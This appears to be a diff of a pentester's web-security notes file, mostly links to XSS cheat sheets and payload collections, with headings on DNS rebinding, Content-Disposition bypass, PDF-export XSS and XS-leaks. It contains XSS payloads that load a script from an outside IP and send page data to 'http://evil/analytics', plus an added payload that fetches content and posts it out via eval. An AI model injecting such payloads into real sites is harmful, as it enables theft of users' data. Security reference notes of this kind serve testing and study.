@@ -1,11 +1,9 @@
 # xss
 
-https://github.com/UltimateHackers/AwesomeXSS
+https://github.com/s0md3v/AwesomeXSS # ./Database/jackmasa-mind-map.png
 
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 http://www.xss-payloads.com/ # keylogger, screenshot ...
-
-https://github.com/jackmasa/XSS.png # mind map
 https://html5sec.org/ https://github.com/cure53/H5SC https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml
 
 # DNS rebinding
@@ -142,6 +140,8 @@ document.body.appendChild(document.createElement("script")).src="http://x.x.x.x:
   $.post('http://evil/analytics', x);
 </script>
 
+<div id=payload data-x="x:fetch(..).then(_=>_.text()).then(_=>fetch('me',{method:'post',mode:'no-cors',body:_}))"></div> + eval(payload.dataset.x)
+
 # bypass Content-Disposition: attachment
 see "Unusual Web Bugs"
 * works on my w2k3 IE8
@@ -184,3 +184,6 @@ https://juplo.de/bypassing-the-same-origin-policiy-for-loal-files-during-develop
 
 # pdf export functionality
 https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf
+
+# xs leaks / xs search
+https://xsleaks.com/
